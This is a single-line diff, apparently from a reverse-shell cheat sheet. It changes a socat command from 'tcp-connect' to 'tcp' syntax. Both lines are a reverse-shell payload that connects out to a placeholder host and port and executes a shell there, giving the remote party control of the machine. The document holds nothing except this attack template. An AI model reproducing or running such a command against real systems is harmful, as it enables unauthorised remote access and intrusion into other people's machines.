@@ -1,1 +1,1 @@
-socat tcp-connect:*\host*:*\port* exec:*\shell*,stderr
+socat tcp:*\host*:*\port* exec:*\shell*,stderr
